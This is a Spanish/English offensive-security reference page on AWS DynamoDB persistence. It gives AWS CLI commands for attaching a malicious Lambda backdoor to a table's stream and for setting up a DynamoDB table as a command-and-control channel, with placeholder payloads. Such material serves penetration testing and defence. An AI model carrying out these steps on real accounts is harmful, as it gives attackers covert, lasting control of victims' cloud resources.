# AWS - DynamoDB Persistencia

{{#include ../../../../banners/hacktricks-training.md}}

### DynamoDB

Para más información, consulta:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### DynamoDB Triggers con Lambda Backdoor

Usando triggers de DynamoDB, un atacante puede crear una **stealthy backdoor** asociando una función Lambda maliciosa a una tabla. La función Lambda puede activarse cuando se añade, modifica o elimina un item, permitiendo al atacante ejecutar código arbitrario dentro de la cuenta AWS.
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
Para mantener la persistencia, el attacker puede crear o modificar elementos en la tabla DynamoDB, lo que activará la Lambda function maliciosa. Esto permite al attacker ejecutar código dentro de la cuenta AWS sin interacción directa con la Lambda function.

### DynamoDB as a C2 Channel

An attacker puede usar una tabla DynamoDB como un **command and control (C2) channel** creando elementos que contengan commands y usando compromised instances o Lambda functions para obtener y ejecutar esos commands.
```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```
Las instancias comprometidas o Lambda functions pueden consultar periódicamente la C2 table en busca de nuevos comandos, ejecutarlos y, opcionalmente, reportar los resultados de vuelta a la C2 table. Esto permite al atacante mantener persistencia y control sobre los recursos comprometidos.

{{#include ../../../../banners/hacktricks-training.md}}
